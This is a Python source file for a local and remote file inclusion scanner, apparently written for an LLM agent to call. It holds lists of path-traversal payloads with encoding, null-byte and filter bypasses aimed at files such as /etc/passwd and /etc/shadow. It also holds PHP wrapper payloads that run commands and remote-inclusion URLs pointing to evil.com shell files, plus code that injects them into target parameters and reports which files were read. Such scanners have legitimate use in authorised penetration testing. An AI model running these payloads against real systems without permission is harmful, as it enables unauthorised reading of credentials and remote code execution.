"""
LFI/RFI Scanner - Local/Remote File Inclusion Detection
Easy for LLM to test file inclusion vulnerabilities
"""

import re
from typing import Dict, List, Optional, Any
from dataclasses import dataclass

import sys
sys.path.append('..')
from core.http_client import HTTPClient, Response


@dataclass
class LFIResult:
    """LFI/RFI test result"""
    vulnerable: bool
    payload: str
    vuln_type: str  # lfi, rfi, path_traversal
    file_read: str  # What file was read
    evidence: str
    confidence: str
    
    def to_dict(self) -> Dict:
        return {
            "vulnerable": self.vulnerable,
            "payload": self.payload,
            "vuln_type": self.vuln_type,
            "file_read": self.file_read,
            "evidence": self.evidence,
            "confidence": self.confidence
        }


class LFIScanner:
    """
    LFI/RFI vulnerability scanner
    
    Usage for LLM:
    - scanner.test_parameter(url, param) - Test for LFI
    - scanner.test_path_traversal(url, param) - Test path traversal
    - scanner.get_payloads() - Get LFI payloads
    """
    
    def __init__(self, client: Optional[HTTPClient] = None):
        self.client = client or HTTPClient()
        
        # Linux file paths
        self.linux_files = {
            "/etc/passwd": ["root:", "nobody:", "daemon:"],
            "/etc/shadow": ["root:", "$1$", "$6$"],
            "/etc/hosts": ["localhost", "127.0.0.1"],
            "/proc/self/environ": ["PATH=", "HOME=", "USER="],
            "/proc/version": ["Linux version"],
            "/var/log/apache2/access.log": ["GET", "POST", "HTTP"],
            "/var/log/nginx/access.log": ["GET", "POST", "HTTP"],
        }
        
        # Windows file paths
        self.windows_files = {
            "C:\\Windows\\win.ini": ["fonts", "extensions"],
            "C:\\Windows\\System32\\drivers\\etc\\hosts": ["localhost", "127.0.0.1"],
            "C:\\Windows\\system.ini": ["drivers", "boot"],
            "C:\\inetpub\\logs\\LogFiles": ["GET", "POST"],
        }
        
        # Path traversal payloads
        self.traversal_payloads = {
            "basic": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "....//....//....//etc/passwd",
                "..%2f..%2f..%2fetc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
                "..%252f..%252f..%252fetc/passwd",
                "..%c0%af..%c0%af..%c0%afetc/passwd",
                "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
            ],
            "null_byte": [
                "../../../etc/passwd%00",
                "../../../etc/passwd%00.jpg",
                "../../../etc/passwd%00.php",
                "....//....//etc/passwd%00",
            ],
            "double_encoding": [
                "%252e%252e%252f%252e%252e%252fetc/passwd",
                "..%c0%ae..%c0%aeetc/passwd",
            ],
            "wrappers": [
                "php://filter/convert.base64-encode/resource=/etc/passwd",
                "php://filter/read=string.rot13/resource=/etc/passwd",
                "php://input",
                "data://text/plain,<?php phpinfo(); ?>",
                "expect://id",
                "file:///etc/passwd",
            ],
            "rfi": [
                "http://evil.com/shell.txt",
                "https://raw.githubusercontent.com/evil/shell.txt",
                "//evil.com/shell.txt",
                "ftp://evil.com/shell.txt",
            ]
        }
        
        # Bypass techniques
        self.bypass_payloads = [
            # Double slashes
            "..//..//..//etc/passwd",
            # Mixed encodings
            "..%5c..%5c..%5cetc/passwd",
            # Unicode
            "..%c0%af..%c0%afetc/passwd",
            # Path truncation
            "a]../../../../../etc/passwd",
            # Wrapper bypass
            "....//....//....//etc/passwd",
            # Nested traversal
            "....\\\\....\\\\....\\\\etc/passwd",
        ]

    def test_parameter(self, url: str, param: str, method: str = "GET",
                       os_type: str = "linux") -> List[LFIResult]:
        """
        Test parameter for LFI/RFI
        
        Args:
            url: Target URL
            param: Parameter to test
            method: HTTP method
            os_type: Target OS (linux/windows)
        
        Returns:
            List of LFI findings
        """
        results = []
        
        # Test path traversal
        results.extend(self.test_path_traversal(url, param, method, os_type))
        
        # Test PHP wrappers if applicable
        results.extend(self.test_php_wrappers(url, param, method))
        
        return results

    def test_path_traversal(self, url: str, param: str, method: str = "GET",
                           os_type: str = "linux") -> List[LFIResult]:
        """Test for path traversal"""
        results = []
        
        target_files = self.linux_files if os_type == "linux" else self.windows_files
        
        for category, payloads in self.traversal_payloads.items():
            if category in ["rfi", "wrappers"]:
                continue
                
            for payload in payloads:
                response = self.client.inject_payload(url, param, payload, method)
                analysis = self._check_file_content(response, target_files)
                
                if analysis["found"]:
                    results.append(LFIResult(
                        vulnerable=True,
                        payload=payload,
                        vuln_type="lfi_path_traversal",
                        file_read=analysis["file"],
                        evidence=analysis["evidence"],
                        confidence=analysis["confidence"]
                    ))
        
        return results

    def test_php_wrappers(self, url: str, param: str, 
                         method: str = "GET") -> List[LFIResult]:
        """Test PHP stream wrappers"""
        results = []
        
        for payload in self.traversal_payloads["wrappers"]:
            response = self.client.inject_payload(url, param, payload, method)
            
            # Check for base64 encoded content
            if "php://filter/convert.base64-encode" in payload:
                # Look for base64 output
                import base64
                for potential_b64 in re.findall(r'[A-Za-z0-9+/=]{50,}', response.body):
                    try:
                        decoded = base64.b64decode(potential_b64).decode('utf-8', errors='ignore')
                        if any(indicator in decoded.lower() for indicator in ["root:", "<?php", "password"]):
                            results.append(LFIResult(
                                vulnerable=True,
                                payload=payload,
                                vuln_type="php_wrapper_lfi",
                                file_read="base64_decoded_file",
                                evidence=f"Base64 content decoded: {decoded[:100]}",
                                confidence="high"
                            ))
                    except:
                        pass
            
            # Check for phpinfo output
            if "phpinfo" in payload and "PHP Version" in response.body:
                results.append(LFIResult(
                    vulnerable=True,
                    payload=payload,
                    vuln_type="php_wrapper_rce",
                    file_read="phpinfo",
                    evidence="phpinfo() executed",
                    confidence="high"
                ))
        
        return results

    def _check_file_content(self, response: Response,
                           target_files: Dict[str, List[str]]) -> Dict[str, Any]:
        """Check if response contains file content"""
        body = response.body
        
        for filepath, indicators in target_files.items():
            for indicator in indicators:
                if indicator.lower() in body.lower():
                    return {
                        "found": True,
                        "file": filepath,
                        "evidence": f"Found indicator: {indicator}",
                        "confidence": "high"
                    }
        
        # Check for common file indicators
        generic_indicators = [
            ("root:x:", "/etc/passwd", "high"),
            ("nobody:", "/etc/passwd", "medium"),
            ("[fonts]", "win.ini", "high"),
            ("Linux version", "/proc/version", "high"),
        ]
        
        for indicator, file, confidence in generic_indicators:
            if indicator in body:
                return {
                    "found": True,
                    "file": file,
                    "evidence": f"Found: {indicator}",
                    "confidence": confidence
                }
        
        return {"found": False, "file": None, "evidence": "", "confidence": "none"}

    def get_payloads(self, category: str = "all") -> Dict[str, Any]:
        """Get LFI payloads for LLM"""
        if category == "all":
            return {
                "traversal": self.traversal_payloads,
                "linux_files": list(self.linux_files.keys()),
                "windows_files": list(self.windows_files.keys()),
                "bypass": self.bypass_payloads
            }
        return {category: self.traversal_payloads.get(category, [])}

    def generate_payload(self, file_path: str, depth: int = 5,
                        technique: str = "basic",
                        null_byte: bool = False) -> str:
        """
        Generate LFI payload
        
        Args:
            file_path: Target file to read
            depth: Directory traversal depth
            technique: Encoding technique
            null_byte: Add null byte (for old PHP)
        
        Returns:
            Generated payload
        """
        traversal = "../" * depth
        
        if technique == "encoded":
            traversal = "%2e%2e%2f" * depth
        elif technique == "double_encoded":
            traversal = "%252e%252e%252f" * depth
        elif technique == "unicode":
            traversal = "..%c0%af" * depth
        
        payload = traversal + file_path
        
        if null_byte:
            payload += "%00"
        
        return payload

    def get_summary(self, results: List[LFIResult]) -> Dict[str, Any]:
        """Get summary of LFI scan results"""
        vulnerable = [r for r in results if r.vulnerable]
        
        return {
            "total_tests": len(results),
            "vulnerable_count": len(vulnerable),
            "vuln_types": list(set(r.vuln_type for r in vulnerable)),
            "files_read": list(set(r.file_read for r in vulnerable)),
            "vulnerable_payloads": [r.payload for r in vulnerable],
            "highest_confidence": max((r.confidence for r in vulnerable), default="none")
        }
